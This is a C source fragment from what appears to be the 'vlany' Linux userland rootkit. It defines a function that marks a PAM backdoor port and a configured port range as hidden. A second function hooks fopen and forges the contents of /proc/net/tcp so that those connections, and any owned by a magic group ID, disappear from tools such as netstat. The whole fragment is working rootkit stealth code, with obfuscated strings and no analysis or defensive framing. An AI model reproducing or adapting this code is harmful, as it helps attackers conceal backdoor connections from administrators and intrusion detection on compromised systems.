int hidden_port(int lport, int rport)
{
    #ifdef DEBUG
        printf("[vlany] hidden_port() called\n");
    #endif

    if(lport == PAM_PORT || rport == PAM_PORT) return 1;
    if(lport >= LOW_PORT && lport <= HIGH_PORT) return 1;
    if(rport >= LOW_PORT && rport <= HIGH_PORT) return 1;

    // neither of the ports are hidden. ok bye
    return 0;
}

FILE *forge_proc_net_tcp(const char *filename)
{
    #ifdef DEBUG
        printf("[vlany] forge_proc_net_tcp() called\n");
    #endif

    HOOK(old_fopen, CFOPEN);

    FILE *tmp, *pnt = old_fopen(filename, "r");

    if((tmp = tmpfile()) == NULL) return pnt;

    unsigned long rxq, txq, time_len, retr, inode;
    int local_port, rem_port, d, state, uid, timer_run, timeout;
    char line[LINE_MAX], rem_addr[128], local_addr[128], more[512];

    char *proc_net_string = strdup(PROC_NET_STRING); xor(proc_net_string);

    while(fgets(line, LINE_MAX, pnt) != NULL)
    {
        sscanf(line, proc_net_string,
               &d, local_addr, &local_port, rem_addr, &rem_port, &state,
               &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
               &inode, more);

        if(!hidden_port(local_port, rem_port) && uid != MAGIC_GID) fputs(line, tmp);
    }

    CLEAN(proc_net_string);

    fclose(pnt);
    if(tmp != NULL) fseek(tmp, 0, SEEK_SET);
    return tmp;
}
